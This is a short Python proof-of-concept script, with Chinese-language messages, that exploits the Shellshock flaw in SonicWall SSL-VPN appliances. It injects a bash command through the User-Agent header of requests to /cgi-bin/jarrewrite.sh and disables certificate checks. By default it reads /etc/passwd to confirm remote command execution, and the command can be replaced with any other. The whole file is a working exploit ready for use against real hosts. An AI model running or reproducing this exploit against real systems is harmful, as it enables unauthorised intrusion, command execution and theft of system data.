import requests
import sys
import random

def title():
    print('+------------------------------------------')
    print('+    Version: SonicWall SSL-VPN            ')
    print('+    使用格式:  python3 poc.py               ')
    print('+------------------------------------------')

def run_proto(target, cmd):
    vuln_url = target + "/cgi-bin/jarrewrite.sh"
    headers = {"User-Agent": "() { :; }; echo ; /bin/bash -c '%s'" % cmd}
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("正在请求 {}/cgi-bin/jarrewrite.shm".format(target))
        if "root" in response.text and response.status_code == 200:
            return True
        else:
            return POC_2(target, cmd)
    except Exception as e:
        print(e)
        return POC_2(target, cmd)
#timeout=5
def POC_2(target, cmd):
    vuln_url = target + "/cgi-bin/jarrewrite.sh"
    headers = {"User-Agent": "() { :; }; echo ; /bin/bash -c '%s'" % (cmd)}
    print("第二次请求 {}/cgi-bin/jarrewrite.sh".format(target))
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=3)
        print(response.text)
        if "root" in response.text and response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        print(e)
        return False

def run(ip, port, cmd):
    proto = ['http', 'https']
    i = 0
    while i < len(proto):
        target = '{}://{}:{}'.format(proto[i], ip, port)
        proto_result = run_proto(target, cmd)
        if proto_result:
            return True
        else:
            i = i + 1

if __name__ == '__main__':
    title()
    cmd = 'cat /etc/passwd'
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = str(int(target.split(':')[1]))
    result = run(ip, port, cmd)
    if result:
        print('Exist')
    else:
        print('UnExist')
